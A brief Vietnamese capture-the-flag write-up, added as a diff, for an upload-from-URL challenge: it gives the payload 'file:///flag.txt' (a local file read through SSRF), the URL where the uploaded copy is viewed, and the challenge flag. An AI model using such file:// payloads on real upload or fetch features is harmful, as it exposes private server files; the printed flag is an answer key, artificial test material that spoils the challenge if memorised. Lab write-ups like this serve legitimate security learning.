@@ -1,0 +1,6 @@
+Bài này dùng PHP wrappers(file://)
+Payload: file:///flag.txt
+=> upload thành công
+Ctrl + U: view source code
+view-source:http://103.97.125.56:32361/static/upload/flag.txt
+Flag: CHH{Ea5y_SSRF_UpL0ad_F1l3_uRL_816f7a25515dcb2cd0dfba57503ca02e}
